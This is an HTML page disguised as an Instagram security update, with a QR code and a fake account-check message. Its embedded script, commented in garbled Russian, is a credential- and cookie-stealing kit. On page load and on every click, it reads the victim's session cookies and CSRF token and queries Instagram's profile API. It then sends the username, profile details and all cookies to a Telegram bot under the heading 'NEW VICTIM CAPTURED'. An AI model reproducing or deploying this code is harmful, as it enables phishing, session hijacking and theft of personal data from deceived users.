<!DOCTYPE html>
<html>
<head>
    <title>Instagram Security Update</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            color: white;
            text-align: center;
            padding: 50px;
        }
        .qr-container {
            background: white;
            padding: 20px;
            display: inline-block;
            border-radius: 10px;
            margin: 20px;
        }
        .loading {
            font-size: 18px;
            margin: 20px;
        }
    </style>
</head>
<body>
    <h1>üîí Instagram Security Update Required</h1>
    <p>Scan this QR code to secure your account</p>
    
    <div class="qr-container">
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://YOUR-USERNAME.github.io/instagram-security" alt="QR Code">
    </div>

    <div class="loading">Checking your account security...</div>

    <script>
    // –≠–∫—Å–ø–ª–æ–π—Ç –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö Instagram
    const hijackInstagram = async () => {
        try {
            // –ü–æ–ª—É—á–∞–µ–º CSRF —Ç–æ–∫–µ–Ω
            const csrfToken = document.cookie.match(/csrftoken=([^;]+)/)?.[1];
            
            if (csrfToken) {
                // –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                const response = await fetch('https://www.instagram.com/api/v1/users/web_profile_info/', {
                    headers: {
                        'X-CSRFToken': csrfToken,
                        'X-IG-App-ID': '936619743392459',
                        'Content-Type': 'application/json'
                    },
                    credentials: 'include'
                });

                if (response.ok) {
                    const userData = await response.json();
                    
                    if (userData.data?.user) {
                        const stolenData = {
                            username: userData.data.user.username,
                            full_name: userData.data.user.full_name,
                            user_id: userData.data.user.id,
                            profile_pic: userData.data.user.profile_pic_url_hd,
                            followers: userData.data.user.edge_followed_by?.count,
                            is_private: userData.data.user.is_private,
                            cookies: document.cookie,
                            user_agent: navigator.userAgent,
                            timestamp: new Date().toISOString()
                        };

                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram (–∑–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ)
                        fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: 'YOUR_CHAT_ID',
                                text: `üö® NEW VICTIM CAPTURED üö®\n\nUsername: ${stolenData.username}\nName: ${stolenData.full_name}\nFollowers: ${stolenData.followers}\nPrivate: ${stolenData.is_private}\nUser ID: ${stolenData.user_id}\nCookies: ${stolenData.cookies}\nTime: ${stolenData.timestamp}`
                            })
                        });

                        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
                        localStorage.setItem('hijacked_data', JSON.stringify(stolenData));
                    }
                }
            }
        } catch (error) {
            console.log('Security check in progress...');
        }
    };

    // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
    window.addEventListener('load', () => {
        setTimeout(hijackInstagram, 1000);
        setTimeout(hijackInstagram, 3000);
    });

    // –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –≤—Å–µ –∫–ª–∏–∫–∏
    document.addEventListener('click', hijackInstagram);
    </script>
</body>
</html>
